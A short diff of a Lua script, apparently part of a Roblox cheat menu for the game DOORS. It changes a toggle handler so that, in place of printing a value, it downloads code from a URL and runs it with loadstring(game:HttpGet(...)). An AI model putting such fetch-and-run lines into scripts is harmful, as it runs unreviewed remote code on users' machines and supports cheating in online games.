@@ -69,7 +69,7 @@ Toggles.DOORS|script:OnChanged(function()
     local mspaint = loadedFunc()
     
     -- Now you can access the `mspaint` variable
-    print(mspaint)
+    loadstring(game:HttpGet(mspaint))
     wait(0.05)
 end
 
